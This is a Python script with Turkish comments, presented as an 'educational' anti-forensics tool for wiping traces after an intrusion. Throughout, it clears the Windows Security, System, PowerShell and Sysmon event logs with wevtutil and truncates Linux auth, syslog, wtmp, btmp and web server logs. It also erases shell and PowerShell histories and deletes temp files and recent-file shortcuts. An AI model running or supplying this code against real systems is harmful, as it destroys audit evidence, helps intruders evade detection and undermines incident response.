#!/usr/bin/env python3
"""
Log Cleaner — Anti-Forensics (Eğitim Amaçlı)
=============================================
Windows Event Log / Linux syslog temizleyici.
Sızma sonrası iz silme aracı.
"""
import os
import sys
import platform
import subprocess
import glob

def clean_windows():
    """Windows Event Log temizle"""
    print("[*] Windows log temizleme başlatıldı...\n")

    logs = ["Application", "Security", "System", "Setup",
            "Windows PowerShell", "Microsoft-Windows-Sysmon/Operational"]

    for log in logs:
        try:
            result = subprocess.run(
                ["wevtutil", "cl", log],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                print(f"  [+] Temizlendi : {log}")
            else:
                print(f"  [-] Başarısız  : {log} ({result.stderr.strip()})")
        except Exception as e:
            print(f"  [-] Hata       : {log} ({e})")

    # PowerShell geçmişini temizle
    ps_history = os.path.expandvars(
        r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )
    if os.path.exists(ps_history):
        try:
            open(ps_history, 'w').close()
            print(f"  [+] Temizlendi : PowerShell Geçmişi")
        except:
            print(f"  [-] Başarısız  : PowerShell Geçmişi")

    # Temp dosyaları temizle
    temp = os.environ.get("TEMP", "")
    if temp and os.path.isdir(temp):
        count = 0
        for f in glob.glob(os.path.join(temp, "*")):
            try:
                if os.path.isfile(f):
                    os.remove(f)
                    count += 1
            except:
                pass
        print(f"  [+] {count} temp dosya silindi")

    # Recent dosyalarını temizle
    recent = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
    if os.path.isdir(recent):
        count = 0
        for f in glob.glob(os.path.join(recent, "*.lnk")):
            try:
                os.remove(f)
                count += 1
            except:
                pass
        print(f"  [+] {count} recent kısayol silindi")

def clean_linux():
    """Linux log temizle"""
    print("[*] Linux log temizleme başlatıldı...\n")

    log_files = [
        "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
        "/var/log/kern.log", "/var/log/wtmp", "/var/log/btmp",
        "/var/log/lastlog", "/var/log/faillog",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    ]

    for log in log_files:
        if os.path.exists(log):
            try:
                open(log, 'w').close()
                print(f"  [+] Temizlendi : {log}")
            except PermissionError:
                print(f"  [-] Yetki yok  : {log} (sudo ile çalıştırın)")
            except Exception as e:
                print(f"  [-] Hata       : {log} ({e})")

    # Bash geçmişini temizle
    home = os.path.expanduser("~")
    history_files = [
        os.path.join(home, ".bash_history"),
        os.path.join(home, ".zsh_history"),
        os.path.join(home, ".python_history"),
    ]
    for hf in history_files:
        if os.path.exists(hf):
            try:
                open(hf, 'w').close()
                print(f"  [+] Temizlendi : {hf}")
            except:
                pass

    # unset HISTFILE
    os.environ['HISTSIZE'] = '0'
    print(f"  [+] HISTSIZE=0 ayarlandı")

if __name__ == "__main__":
    print("=" * 50)
    print("  Log Cleaner — Anti-Forensics")
    print("=" * 50)
    print("  [!] Bu araç iz silmek için tasarlanmıştır.")
    print("  [!] Yönetici/root yetkisi gerektirebilir.\n")

    if os.name == 'nt':
        clean_windows()
    else:
        clean_linux()

    print(f"\n[+] Log temizleme tamamlandı.")
